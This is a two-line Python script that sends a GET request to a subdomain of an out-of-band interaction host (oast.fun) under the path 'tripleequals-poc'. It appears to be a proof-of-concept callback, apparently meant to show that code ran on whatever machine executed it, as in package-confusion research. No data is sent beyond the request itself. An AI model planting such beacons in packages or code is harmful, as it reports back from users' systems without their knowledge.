import requests
requests.get("https://vovdismvlwftwnvghtcidyqr0gzqar1qn.oast.fun/tripleequals-poc")
